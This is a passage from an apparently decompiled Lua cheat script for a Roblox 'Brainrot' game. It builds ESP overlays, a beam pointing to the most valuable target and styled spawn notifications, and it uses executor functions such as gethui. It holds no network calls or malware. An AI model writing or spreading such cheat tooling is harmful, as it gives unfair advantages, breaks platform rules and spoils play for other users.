								v10.MutationRow.TextGradient.Color = v10.SourceMutationGrad.Color
							end)
						end
					end
				end

				local v10 = fn4()
				local flag92 = flag9
				local v102

				if flag9 then
					v102 = v9
				else
					v102 = flag92
				end

				if not (v102 and v10) then
					if attachment then
						fn30()
					end
				else
					local flag11 = parent ~= v10 or parent2 ~= v9.Root

					if not flag11 then
						flag11 = not (attachment and attachment.Parent)
					end

					if flag11 then
						fn31(v10, v9.Root, v9.BeamTint)
					end
				end
			end
		end)
	end

	v7.Event:Connect(fn38)
	chilliBrainrotESPRuntime.Destroying:Connect(fn38)

	local brainrotEspToggle = brainrotEspSection:CreateToggle({
		Name = "Brainrot ESP",
		Default = true,
		Callback = function(arg)
			if arg then
				fn39()
			else
				fn38()
			end
		end,
	})

	brainrotEspSection:CreateSlider({
		Name = "Brainrot ESP Size",
		Min = 50,
		Max = 200,
		Default = 100,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		Quick = false,
		SubOf = brainrotEspToggle,
		Callback = function(arg)
			n5 = math.clamp((tonumber(arg) or 100) / 100, 0.5, 2)

			for _, v9 in pairs(kMap) do
				fn14(v9)
			end
		end,
	})

	brainrotEspSection:CreateMultiDropdown({
		Name = "Show Information",
		Note = "Choose what each Brainrot tag shows.",
		Options = { "Name", "Mutation", "Value", "Trails", "Rarity" },
		Default = { "Name", "Value", "Trails" },
		Quick = false,
		SubOf = brainrotEspToggle,
		Callback = function(arg)
			local enabledFlags2 = { Name = false, Mutation = false, Value = false, Trails = false, Rarity = false }

			if type(arg) == "table" then
				for k, v9 in pairs(arg) do
					if type(v9) == "string" then
						if enabledFlags2[v9] ~= nil then
							enabledFlags2[v9] = true
							continue
						end

						if v9 ~= "Type" then
							continue
						end
					else
						if not (type(k) == "string" and v9 == true) then
							continue
						end

						if enabledFlags2[k] ~= nil then
							enabledFlags2[k] = true
							continue
						end

						if k ~= "Type" then
							continue
						end
					end

					enabledFlags2.Rarity = true
				end
			end

			enabledFlags = enabledFlags2
		end,
	})

	local brainrotEspMinValueSlider = nil
	local n8 = 1
	local str = "M/s"

	local function fn40(arg, arg2)
		if arg ~= nil then
			n8 = math.floor(tonumber(arg) or n8)
		end

		if arg2 ~= nil then
			str = tostring(arg2)
		elseif brainrotEspMinValueSlider and brainrotEspMinValueSlider.GetUnit then
			local unit = brainrotEspMinValueSlider:GetUnit()

			if unit and unit ~= "" then
				str = tostring(unit)
			end
		end

		n6 = n8 * (configMap[str] or configMap["M/s"]).Mult
	end

	local function fn41(arg)
		str = arg
		local configEntry = configMap[arg] or configMap["M/s"]

		if brainrotEspMinValueSlider and brainrotEspMinValueSlider.SetRange then
			brainrotEspMinValueSlider:SetRange(configEntry.Min, configEntry.Max)
			local min = brainrotEspMinValueSlider:Get() or configEntry.Min
			local min2 = configEntry.Min
			local max = configEntry.Max
			local n9 = math.clamp(math.floor(min + 0.5), min2, max)

			if n9 ~= min then
				brainrotEspMinValueSlider:Set(n9)
			else
				fn40(n9, arg)
			end
		else
			fn40(nil, arg)
		end
	end

	brainrotEspMinValueSlider = brainrotEspSection:CreateSlider({
		Name = "Brainrot ESP Min Value",
		Note = "Filters out Brainrots below this threshold. Tap arrow to change unit (K/s, M/s, B/s).",
		Min = 0,
		Max = 1000,
		Default = 1,
		AllowDecimals = false,
		Increment = 1,
		Unit = {
			Default = "M/s",
			Selector = true,
			Options = { "K/s", "M/s", "B/s" },
			ColorEnabled = true,
			Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
			Callback = function(arg)
				fn41(arg)
			end,
		},
		Quick = false,
		SubOf = brainrotEspToggle,
		Callback = function(arg)
			fn40(arg, nil)
		end,
	})

	brainrotEspSection:CreateToggle({
		Name = "Best Brainrot Only",
		Default = true,
		Quick = false,
		SubOf = brainrotEspToggle,
		Callback = function(arg)
			flag10 = arg == true
		end,
	})

	brainrotEspSection:CreateToggle({
		Name = "Beam To Best",
		Note = "Draws one beam from you to the highest generation Brainrot.",
		Default = true,
		Quick = false,
		SubOf = brainrotEspToggle,
		Callback = function(arg)
			flag9 = arg == true
		end,
	})
end

local str
str = "__ChilliBrainrotNotificationRuntime"
local n7
n7 = 0.75
local n8
n8 = 3
local chilliBrainrotNotificationRuntim, v8
chilliBrainrotNotificationRuntim, v8 = fn3("__ChilliBrainrotNotificationRuntime")
local flag11
flag11 = false
local str2
str2 = ""
local soundId
soundId = ""
local str3
str3 = ""
local n9
n9 = 1000000
local flag12
flag12 = true
local n10
n10 = 0
local n11
n11 = 0
local connection3
connection3 = nil
local weakCache2
weakCache2 = setmetatable({}, { __mode = "k" })
local chilliSpecialNotificationSlots, screenGui, notificationStack, TweenService, font2, tbl9, tbl10, tbl11, tbl12, fn20
local fn21

do
	local v9 = nil
	local Gradients = nil
	chilliSpecialNotificationSlots = {}
	screenGui = nil
	notificationStack = nil
	TweenService = game:GetService("TweenService")
	font2 = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	tbl9 = {}
	tbl10 = {}
	tbl11 = {}

	pcall(function()
		local Animals = require(ReplicatedStorage.Datas.Animals)

		if type(Animals) == "table" then
			tbl9 = Animals
		end
	end)

	pcall(function()
		local Mutations = require(ReplicatedStorage.Datas.Mutations)

		if type(Mutations) == "table" then
			tbl10 = Mutations
		end
	end)

	pcall(function()
		local Traits = require(ReplicatedStorage.Datas.Traits)

		if type(Traits) == "table" then
			tbl11 = Traits
		end
	end)

	pcall(function()
		local Gradients2 = require(ReplicatedStorage.Packages.Gradients)

		if type(Gradients2) == "table" then
			Gradients = Gradients2
		end
	end)

	tbl12 = {}
	local tbl13 = { Preset = "Zebra", Background = Color3.fromRGB(16, 16, 20) }
	local colorSequenceNew = ColorSequence.new
	local tbl14 = {}
	local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
	local colorKeypoint2 = ColorSequenceKeypoint.new(0.24, Color3.fromRGB(45, 45, 55))
	local colorKeypoint3 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
	local colorKeypoint4 = ColorSequenceKeypoint.new(0.76, Color3.fromRGB(45, 45, 55))
	tbl14[1] = colorKeypoint
	tbl14[2] = colorKeypoint2
	tbl14[3] = colorKeypoint3
	tbl14[4] = colorKeypoint4

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)))
		table.move(values, 1, values.n, 5, tbl14)
	end

	tbl13.Colors = colorSequenceNew(tbl14)
	tbl12["Secret Zebra"] = tbl13

	local function fn22()
		if not v9 then
			local controllers = ReplicatedStorage:FindFirstChild("Controllers")
			controllers = controllers and controllers:FindFirstChild("NotificationController")
			if not (controllers and controllers:IsA("ModuleScript")) then
				return nil
			end
			local ok5, result = pcall(require, controllers)

			if ok5 and type(result) == "table" then
				v9 = result
			end
		end

		return v9
	end

	local function fn23(arg)
		local match = tostring(arg or ""):match("(%d+)")
		if match and tonumber(match) and tonumber(match) > 0 then
			return "rbxassetid://" .. match
		end
		return nil
	end

	local function fn24(arg)
		if not arg then
			return nil
		end

		if arg:IsA("Sound") then
			return fn23(arg.SoundId)
		end
		local v10

		if arg:IsA("StringValue") then
			v10 = fn23(arg.Value)
			if v10 then
				return v10
			end
		end

		v10 = fn23(arg:GetAttribute("SoundId"))
		if v10 then
			return v10
		end
		local sound = arg:FindFirstChildWhichIsA("Sound", true)
		return sound and fn23(sound.SoundId) or nil
	end

	local function fn25()
		local v10 = ipairs
		local tbl15 = {}
		local SoundService = table.pack(game:GetService("SoundService"))
		tbl15[1] = ReplicatedStorage

		do
			local values = table.pack(table.unpack(SoundService, 1, SoundService.n))
			table.move(values, 1, values.n, 2, tbl15)
		end

		for _, v11 in v10(tbl15) do
			local crystalSpawn = v11:FindFirstChild("CrystalSpawn", true)
			local v12 = fn24(crystalSpawn)
			if v12 then
				return v12
			end
		end

		return ""
	end

	fn20 = function(arg)
		str2 = tostring(arg or "")
	end

	fn21 = function()
		local v10 = fn23(str2)

		if not v10 then
			soundId = str3
			uiLibrary.Notify("Sound ID Failed", "Invalid asset ID. Restored the default Crystal sound.", 5)
			return false
		end

		local chilliSoundIdValidation = Instance.new("Sound")
		chilliSoundIdValidation.Name = "ChilliSoundIdValidation"
		chilliSoundIdValidation.SoundId = v10
		chilliSoundIdValidation.Volume = 0
		chilliSoundIdValidation.Parent = game:GetService("SoundService")
		local flag13 = false

		local flag132 = pcall(function()
			game:GetService("ContentProvider"):PreloadAsync({ chilliSoundIdValidation }, function(arg, arg2)
				if arg2 == Enum.AssetFetchStatus.Success then
					flag13 = true
				end
			end)
		end) and (flag13 or chilliSoundIdValidation.IsLoaded or chilliSoundIdValidation.TimeLength > 0)

		chilliSoundIdValidation:Destroy()

		if not flag132 then
			soundId = str3
			uiLibrary.Notify("Sound ID Failed", "Audio unavailable. Restored the default Crystal sound.", 5)
			return false
		end

		soundId = v10
		str2 = v10
		uiLibrary.Notify("Sound ID Applied", v10 .. " is now used for Brainrot notifications.", 5)
		return true
	end

	local function destroyAll()
		if soundId == "" then
			return
		end
		local chilliBrainrotNotificationSound = Instance.new("Sound")
		chilliBrainrotNotificationSound.Name = "ChilliBrainrotNotificationSound"
		chilliBrainrotNotificationSound.SoundId = soundId
		chilliBrainrotNotificationSound.Volume = 1
		chilliBrainrotNotificationSound.Parent = game:GetService("SoundService")

		if not pcall(function()
			chilliBrainrotNotificationSound:Play()
		end) then
			chilliBrainrotNotificationSound:Destroy()
			return
		end

		game:GetService("Debris"):AddItem(chilliBrainrotNotificationSound, 15)
	end

	str3 = fn25()
	soundId = str3
	str2 = soundId

	local function fn26(parent, arg)
		local uiGradient = Instance.new("UIGradient")
		uiGradient.Color = arg.Colors
		uiGradient.Rotation = 8
		uiGradient.Parent = parent
		local tween = TweenService:Create(uiGradient, TweenInfo.new(1.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), { Rotation = 368 })
		tween:Play()

		return function()
			tween:Cancel()
		end
	end

	local function fn27(arg, parent, name, text, position, size, textSize)
		local clone = arg:Clone()
		clone.Name = name
		clone.Visible = true
		clone.RichText = true
		clone.BackgroundTransparency = 1
		clone.AutomaticSize = Enum.AutomaticSize.None
		clone.AnchorPoint = Vector2.zero
		clone.Position = position
		clone.Size = size
		clone.Text = text
		clone.TextScaled = false
		clone.TextSize = textSize
		clone.TextXAlignment = Enum.TextXAlignment.Left
		clone.TextYAlignment = Enum.TextYAlignment.Center
		clone.FontFace = font2
		clone.Parent = parent
		return clone
	end

	local function fn28(parent, arg, arg2)
		if arg2 and arg2.Parent then
			local ok5, result = pcall(function()
				return arg2:Clone()
			end)

			if not (not ok5 or not result) then
				for _, descendant in ipairs(result:GetDescendants()) do
					if descendant:IsA("ParticleEmitter") or descendant:IsA("Beam") or descendant:IsA("Trail") or descendant:IsA("Light") or descendant:IsA("Sound") or descendant:IsA("Script") or descendant:IsA("LocalScript") then
						descendant:Destroy()
					end
				end

				local worldModel = Instance.new("WorldModel")
				worldModel.Parent = parent
				result.Parent = worldModel

				pcall(function()
					result:PivotTo(CFrame.new())
				end)

				local cframe = CFrame.new()

				local ok6, result2, vector = pcall(function()
					return result:GetBoundingBox()
				end)

				ok6 = ok6 and result2 and vector
				local vector2 = Vector3.new(4, 4, 4)

				if not ok6 then
					vector = vector2
					result2 = cframe
				end

				local position = result2.Position
				local n12 = math.max(math.max(vector.X, vector.Y, vector.Z) * 1.35, 3.5)
				arg.FieldOfView = 40
				arg.CFrame = CFrame.lookAt(position + Vector3.new(n12 * 0.28, n12 * 0.08, -n12), position, Vector3.new(0, 1, 0))
				local humanoid = arg2:FindFirstChildWhichIsA("Humanoid") or arg2:FindFirstChildWhichIsA("AnimationController")
				humanoid = humanoid and humanoid:FindFirstChildOfClass("Animator")
				local humanoid2 = result:FindFirstChildWhichIsA("Humanoid") or result:FindFirstChildWhichIsA("AnimationController")
				local animator = humanoid2 and humanoid2:FindFirstChildOfClass("Animator")

				if humanoid and animator then
					local playingAnimationTracks = humanoid:GetPlayingAnimationTracks()
					playingAnimationTracks = playingAnimationTracks and playingAnimationTracks[1]

					if playingAnimationTracks and playingAnimationTracks.Animation then
						local animation = Instance.new("Animation")
						animation.AnimationId = playingAnimationTracks.Animation.AnimationId

						local ok7, result3 = pcall(function()
							return animator:LoadAnimation(animation)
						end)

						if ok7 and result3 then
							pcall(function()
								result3.Looped = true
								result3:Play(0)
								result3.TimePosition = playingAnimationTracks.TimePosition
								result3:AdjustSpeed(playingAnimationTracks.Speed)
							end)
						end
					end
				end

				return true
			end
		end

		return false
	end

	local function fn29(arg)
		local pos = table.find(chilliSpecialNotificationSlots, arg)

		if pos then
			table.remove(chilliSpecialNotificationSlots, pos)
		end
	end

	local function createFrame()
		if notificationStack and notificationStack.Parent then
			return notificationStack
		end
		local CoreGui2 = CoreGui

		if type(gethui) == "function" then
			local ok5
			ok5, CoreGui2 = pcall(gethui)
			ok5 = ok5 and typeof(CoreGui2) == "Instance"
			local CoreGui3 = CoreGui

			if not ok5 then
				CoreGui2 = CoreGui3
			end
		end

		local name = str .. "Gui"
		local v10 = CoreGui2:FindFirstChild(name)

		if v10 then
			pcall(function()
				v10:Destroy()
			end)
		end

		local screenGui2 = Instance.new("ScreenGui")
		screenGui2.Name = name
		screenGui2.DisplayOrder = 190
		screenGui2.IgnoreGuiInset = true
		screenGui2.ResetOnSpawn = false
		screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui2.Parent = CoreGui2
		local notificationStack2 = Instance.new("Frame")
		notificationStack2.Name = "NotificationStack"
		notificationStack2.AnchorPoint = Vector2.new(0.5, 0)
		notificationStack2.BackgroundTransparency = 1
		notificationStack2.BorderSizePixel = 0
		notificationStack2.Position = UDim2.fromScale(0.5, 0.025)
		notificationStack2.Size = UDim2.new(1, -16, 0.55, 0)
		notificationStack2.Parent = screenGui2
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.FillDirection = Enum.FillDirection.Vertical
		uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		uiListLayout.Padding = UDim.new(0, 5)
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Top
		uiListLayout.Parent = notificationStack2
		screenGui = screenGui2
		notificationStack = notificationStack2
		return notificationStack2
	end

	local function clampValue()
		local currentCamera = Workspace.CurrentCamera
		local x = currentCamera and currentCamera.ViewportSize.X or 1280

		if x <= 0 then
			x = 1280
		end

		return math.clamp((x - 24) / 620, 0.44, 0.72)
	end

	local function fn30(arg, arg2, arg3)
		local secretZebra = tbl12[arg3 or "Secret Zebra"] or tbl12["Secret Zebra"]

		if not (type(arg) ~= "table" or not arg.Model) then
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			local notification = playerGui and playerGui:FindFirstChild("Notification")
			notification = notification and notification:FindFirstChild("Notification")
			notification = notification and notification:FindFirstChild("Template")

			if not (notification and notification:IsA("TextLabel")) then
				local v10 = fn22()

				if v10 and type(v10.Notify) == "function" then
					local str4 = string.upper(tostring(arg.Name or "Brainrot")) .. " APPEARED!  " .. tostring(arg.ValueText or "")
					local v11 = pcall
					local notify = v10.Notify
					arg2 = arg2 or 6
					local top = v11(notify, v10, str4, arg2, nil, "Top")

					if top then
						destroyAll()
					end

					return top
				end
			else
				local frame = createFrame()

				if frame then
					while #chilliSpecialNotificationSlots >= 4 do
						local chilliSpecialNotificationSlots2 = table.remove(chilliSpecialNotificationSlots, 1)

						if chilliSpecialNotificationSlots2 and chilliSpecialNotificationSlots2.Parent then
							chilliSpecialNotificationSlots2:Destroy()
						end
					end

					local chilliSpecialNotificationSlot = Instance.new("Frame")
					chilliSpecialNotificationSlot.Name = "ChilliSpecialNotificationSlot"
					chilliSpecialNotificationSlot.BackgroundTransparency = 1
					chilliSpecialNotificationSlot.BorderSizePixel = 0
					local numVal = clampValue()
					chilliSpecialNotificationSlot.Size = UDim2.new(1, 0, 0, math.ceil(108 * numVal + 7))
					chilliSpecialNotificationSlot.ZIndex = 179
					chilliSpecialNotificationSlot.Parent = frame
					chilliSpecialNotificationSlots[#chilliSpecialNotificationSlots + 1] = chilliSpecialNotificationSlot
					local scaledCardRoot = Instance.new("Frame")
					scaledCardRoot.Name = "ScaledCardRoot"
					scaledCardRoot.AnchorPoint = Vector2.new(0.5, 0)
					scaledCardRoot.BackgroundTransparency = 1
					scaledCardRoot.BorderSizePixel = 0
					scaledCardRoot.Position = UDim2.fromScale(0.5, 0)
					local ceil = math.ceil
					scaledCardRoot.Size = UDim2.fromOffset(math.ceil(620 * numVal), ceil(108 * numVal))
					scaledCardRoot.ZIndex = 179
					scaledCardRoot.Parent = chilliSpecialNotificationSlot
					local uiScale = Instance.new("UIScale")
					uiScale.Scale = numVal * 0.72
					uiScale.Parent = scaledCardRoot
					local chilliSpecialNotification = Instance.new("Frame")
					chilliSpecialNotification.Name = "ChilliSpecialNotification"
					chilliSpecialNotification.BackgroundColor3 = secretZebra.Background
					chilliSpecialNotification.BackgroundTransparency = 0.04
					chilliSpecialNotification.BorderSizePixel = 0
					chilliSpecialNotification.ClipsDescendants = false
					chilliSpecialNotification.AnchorPoint = Vector2.new(0.5, 0)
					chilliSpecialNotification.Position = UDim2.fromOffset(310, 0)
					chilliSpecialNotification.Size = UDim2.fromOffset(620, 108)
					chilliSpecialNotification.ZIndex = 180
					chilliSpecialNotification.Parent = scaledCardRoot
					local uiCorner = Instance.new("UICorner")
					uiCorner.CornerRadius = UDim.new(0, 17)
					uiCorner.Parent = chilliSpecialNotification
					local uiGradient = Instance.new("UIGradient")
					local colorSequenceNew2 = ColorSequence.new
					local tbl15 = {}
					local colorKeypoint5 = ColorSequenceKeypoint.new(0, secretZebra.Background)
					local colorKeypoint6 = ColorSequenceKeypoint.new(0.48, secretZebra.Background:Lerp(Color3.new(1, 1, 1), 0.12))
					local colorSequenceKeypointNew = ColorSequenceKeypoint.new
					local background = secretZebra.Background
					tbl15[1] = colorKeypoint5
					tbl15[2] = colorKeypoint6

					do
						local values = table.pack(colorSequenceKeypointNew(1, background))
						table.move(values, 1, values.n, 3, tbl15)
					end

					uiGradient.Color = colorSequenceNew2(tbl15)
					uiGradient.Rotation = 12
					uiGradient.Parent = chilliSpecialNotification
					local uiStroke = Instance.new("UIStroke")
					uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
					uiStroke.Color = Color3.new(1, 1, 1)
					uiStroke.Thickness = 2.5
					uiStroke.Transparency = 0.05
					uiStroke.Parent = chilliSpecialNotification
					local uiGradient2 = Instance.new("UIGradient")
					uiGradient2.Color = secretZebra.Colors
					uiGradient2.Parent = uiStroke
					local tween = TweenService:Create(uiGradient2, TweenInfo.new(2.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), { Rotation = 360 })
					tween:Play()
					local uiStroke2 = Instance.new("UIStroke")
					uiStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
					uiStroke2.Color = secretZebra.Colors.Keypoints[1].Value
					uiStroke2.Thickness = 7
					uiStroke2.Transparency = 0.72
					uiStroke2.Parent = chilliSpecialNotification
					local brainrotPreview = Instance.new("ViewportFrame")
					brainrotPreview.Name = "BrainrotPreview"
					brainrotPreview.Ambient = Color3.fromRGB(190, 190, 200)
					brainrotPreview.BackgroundColor3 = secretZebra.Background:Lerp(Color3.new(1, 1, 1), 0.08)
					brainrotPreview.BackgroundTransparency = 0.08
					brainrotPreview.BorderSizePixel = 0
					brainrotPreview.ClipsDescendants = true
					brainrotPreview.LightColor = Color3.fromRGB(255, 255, 255)
					brainrotPreview.LightDirection = Vector3.new(-0.4, -0.7, -0.6)
					brainrotPreview.Position = UDim2.fromOffset(11, 9)
					brainrotPreview.Size = UDim2.fromOffset(90, 90)
					brainrotPreview.ZIndex = 183
					brainrotPreview.Parent = chilliSpecialNotification
					local uiCorner2 = Instance.new("UICorner")
					uiCorner2.CornerRadius = UDim.new(0, 14)
					uiCorner2.Parent = brainrotPreview
					local uiStroke3 = Instance.new("UIStroke")
					uiStroke3.Color = Color3.new(1, 1, 1)
					uiStroke3.Thickness = 2
					uiStroke3.Transparency = 0.18
					uiStroke3.Parent = brainrotPreview
					local uiGradient3 = Instance.new("UIGradient")
					uiGradient3.Color = secretZebra.Colors
					uiGradient3.Rotation = -25
					uiGradient3.Parent = uiStroke3
					local camera = Instance.new("Camera")
					camera.Parent = brainrotPreview
					brainrotPreview.CurrentCamera = camera
					fn28(brainrotPreview, camera, arg.Model)
					local brainrotName = fn27(notification, chilliSpecialNotification, "BrainrotName", tostring(arg.Name or "Brainrot"), UDim2.fromOffset(115, 7), UDim2.new(1, -252, 0, 34), 22)
					brainrotName.RichText = false
					brainrotName.TextColor3 = Color3.new(1, 1, 1)
					brainrotName.TextTruncate = Enum.TextTruncate.AtEnd
					brainrotName.Font = Enum.Font.GothamBlack
					brainrotName.ZIndex = 183
					local list = {}

					local function fn31(parent, thickness)
						local specialTextOutline = Instance.new("UIStroke")
						specialTextOutline.Name = "SpecialTextOutline"
						specialTextOutline.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
						specialTextOutline.Color = Color3.fromRGB(0, 0, 0)
						specialTextOutline.Thickness = thickness
						specialTextOutline.Transparency = 0.18
						specialTextOutline.Parent = parent
						local v10 = fn26(parent, secretZebra)

						if v10 then
							list[#list + 1] = v10
						end
					end

					fn31(brainrotName, 1.35)
					local appearedBadge = Instance.new("Frame")
					appearedBadge.Name = "AppearedBadge"
					appearedBadge.AnchorPoint = Vector2.new(1, 0)
					appearedBadge.BackgroundColor3 = secretZebra.Colors.Keypoints[1].Value
					appearedBadge.BackgroundTransparency = 0.08
					appearedBadge.BorderSizePixel = 0
					appearedBadge.Position = UDim2.new(1, -13, 0, 10)
					appearedBadge.Size = UDim2.fromOffset(112, 25)
					appearedBadge.ZIndex = 183
					appearedBadge.Parent = chilliSpecialNotification
					local uiCorner3 = Instance.new("UICorner")
					uiCorner3.CornerRadius = UDim.new(1, 0)
					uiCorner3.Parent = appearedBadge
					local uiGradient4 = Instance.new("UIGradient")
					uiGradient4.Color = secretZebra.Colors
					uiGradient4.Rotation = 12
					uiGradient4.Parent = appearedBadge
					local uiStroke4 = Instance.new("UIStroke")
					uiStroke4.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
					uiStroke4.Color = Color3.new(1, 1, 1)
					uiStroke4.Thickness = 1.25
					uiStroke4.Transparency = 0.2
					uiStroke4.Parent = appearedBadge
					local appearedText = fn27(notification, appearedBadge, "AppearedText", "APPEARED!", UDim2.fromOffset(6, 0), UDim2.new(1, -12, 1, 0), 12)
					appearedText.RichText = false
					appearedText.Font = Enum.Font.Arcade
					appearedText.TextColor3 = Color3.new(1, 1, 1)
					appearedText.TextXAlignment = Enum.TextXAlignment.Center
					appearedText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
					appearedText.TextStrokeTransparency = 0.25
					appearedText.ZIndex = 184
					local generationBadge = Instance.new("Frame")
					generationBadge.Name = "GenerationBadge"
					generationBadge.BackgroundColor3 = Color3.fromRGB(4, 24, 10)
					generationBadge.BackgroundTransparency = 0.18
					generationBadge.BorderSizePixel = 0
					generationBadge.Position = UDim2.fromOffset(115, 44)
					generationBadge.Size = UDim2.fromOffset(142, 26)
					generationBadge.ZIndex = 183
					generationBadge.Parent = chilliSpecialNotification
					local uiCorner4 = Instance.new("UICorner")
					uiCorner4.CornerRadius = UDim.new(0, 8)
					uiCorner4.Parent = generationBadge
					local uiStroke5 = Instance.new("UIStroke")
					uiStroke5.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
					uiStroke5.Color = Color3.fromRGB(75, 255, 104)
					uiStroke5.Thickness = 1.2
					uiStroke5.Transparency = 0.35
					uiStroke5.Parent = generationBadge
					local brainrotValue = fn27(notification, generationBadge, "BrainrotValue", tostring(arg.ValueText or ""), UDim2.fromOffset(9, 0), UDim2.new(1, -18, 1, 0), 18)
					brainrotValue.RichText = false
					brainrotValue.Font = Enum.Font.RobotoMono
					brainrotValue.TextColor3 = Color3.fromRGB(86, 255, 105)
					brainrotValue.TextStrokeColor3 = Color3.fromRGB(0, 32, 7)
					brainrotValue.TextStrokeTransparency = 0.15
					brainrotValue.ZIndex = 184
					local uiGradient5 = Instance.new("UIGradient")
					local colorSequenceNew3 = ColorSequence.new
					local tbl16 = {}
					local colorKeypoint7 = ColorSequenceKeypoint.new(0, Color3.fromRGB(42, 220, 76))
					local colorKeypoint8 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(208, 255, 132))
					local colorSequenceKeypointNew2 = ColorSequenceKeypoint.new
					local color3FromRGB = Color3.fromRGB
					tbl16[1] = colorKeypoint7
					tbl16[2] = colorKeypoint8

					do
						local values = table.pack(colorSequenceKeypointNew2(1, color3FromRGB(38, 255, 105)))
						table.move(values, 1, values.n, 3, tbl16)
					end

					uiGradient5.Color = colorSequenceNew3(tbl16)
					uiGradient5.Rotation = -8
					uiGradient5.Parent = brainrotValue
					local tween2 = TweenService:Create(uiGradient5, TweenInfo.new(1.45, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), { Rotation = 18 })
					tween2:Play()

					list[#list + 1] = function()
						tween2:Cancel()
					end

					if arg.MutationVisible then
						local brainrotMutation = fn27(notification, chilliSpecialNotification, "BrainrotMutation", tostring(arg.MutationText or ""), UDim2.fromOffset(115, 76), UDim2.new(1, -304, 0, 22), 17)
						brainrotMutation.RichText = arg.MutationRichText == true
						brainrotMutation.TextColor3 = arg.MutationColor or Color3.fromRGB(235, 235, 240)
						brainrotMutation.TextStrokeColor3 = arg.MutationStrokeColor or Color3.fromRGB(0, 0, 0)
						brainrotMutation.TextStrokeTransparency = arg.MutationStrokeTransparency or 0.25
						brainrotMutation.TextTruncate = Enum.TextTruncate.AtEnd
						brainrotMutation.ZIndex = 183

						if arg.MutationFontFace then
							brainrotMutation.FontFace = arg.MutationFontFace
						end

						if arg.MutationGradientColor then
							local uiGradient6 = Instance.new("UIGradient")
							uiGradient6.Color = arg.MutationGradientColor
							uiGradient6.Rotation = arg.MutationGradientRotation or 0
							uiGradient6.Transparency = arg.MutationGradientTransparency or NumberSequence.new(0)
							uiGradient6.Parent = brainrotMutation
						else
							local mutationGlow = Instance.new("UIStroke")
							mutationGlow.Name = "MutationGlow"
							mutationGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
							mutationGlow.Color = arg.MutationColor or Color3.new(1, 1, 1)
							mutationGlow.Thickness = 1.1
							mutationGlow.Transparency = 0.5
							mutationGlow.Parent = brainrotMutation
						end
					end

					local frame2 = Instance.new("Frame")
					frame2.AnchorPoint = Vector2.new(1, 0)
					frame2.BackgroundTransparency = 1
					frame2.Position = UDim2.new(1, -13, 0, 74)
					frame2.Size = UDim2.fromOffset(174, 28)
					frame2.ZIndex = 183
					frame2.Parent = chilliSpecialNotification
					local uiListLayout = Instance.new("UIListLayout")
					uiListLayout.FillDirection = Enum.FillDirection.Horizontal
					uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
					uiListLayout.Padding = UDim.new(0, 3)
					uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
					uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
					uiListLayout.Parent = frame2
					local v10 = ipairs
					local traitImages = arg.TraitImages or {}

					for k, traitImage in v10(traitImages) do
						if not (k > 6) then
							local traitBadge = Instance.new("Frame")
							traitBadge.Name = "TraitBadge"
							traitBadge.BackgroundColor3 = secretZebra.Background:Lerp(Color3.new(1, 1, 1), 0.16)
							traitBadge.BackgroundTransparency = 0.12
							traitBadge.BorderSizePixel = 0
							traitBadge.LayoutOrder = k
							traitBadge.Size = UDim2.fromOffset(26, 26)
							traitBadge.ZIndex = 183
							traitBadge.Parent = frame2
							local uiCorner5 = Instance.new("UICorner")
							uiCorner5.CornerRadius = UDim.new(0, 7)
							uiCorner5.Parent = traitBadge
							local uiStroke6 = Instance.new("UIStroke")
							uiStroke6.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
							uiStroke6.Color = secretZebra.Colors.Keypoints[1].Value
							uiStroke6.Thickness = 1
							uiStroke6.Transparency = 0.35
							uiStroke6.Parent = traitBadge
							local imageLabel = Instance.new("ImageLabel")
							imageLabel.BackgroundTransparency = 1
							imageLabel.Image = traitImage
							imageLabel.Position = UDim2.fromOffset(2, 2)
							imageLabel.Size = UDim2.fromOffset(22, 22)
							imageLabel.ZIndex = 184
							imageLabel.Parent = traitBadge
							continue
						end

						break
					end

					local shineClip = Instance.new("Frame")
					shineClip.Name = "ShineClip"
					shineClip.BackgroundTransparency = 1
					shineClip.BorderSizePixel = 0
					shineClip.ClipsDescendants = true
					shineClip.Size = UDim2.fromScale(1, 1)
					shineClip.ZIndex = 182
					shineClip.Parent = chilliSpecialNotification
					local uiCorner5 = Instance.new("UICorner")
					uiCorner5.CornerRadius = UDim.new(0, 17)
					uiCorner5.Parent = shineClip
					local shine = Instance.new("Frame")
					shine.Name = "Shine"
					shine.BackgroundColor3 = Color3.new(1, 1, 1)
					shine.BackgroundTransparency = 0.78
					shine.BorderSizePixel = 0
					shine.Position = UDim2.fromScale(-0.25, 0)
					shine.Rotation = 18
					shine.Size = UDim2.fromScale(0.13, 1.35)
					shine.ZIndex = 182
					shine.Parent = shineClip
					local uiGradient6 = Instance.new("UIGradient")
					local numberSequenceNew = NumberSequence.new
					local tbl17 = {}
					local keypoint = NumberSequenceKeypoint.new(0, 1)
					local keypoint2 = NumberSequenceKeypoint.new(0.5, 0)
					local numberSequenceKeypointNew = NumberSequenceKeypoint.new
					tbl17[1] = keypoint
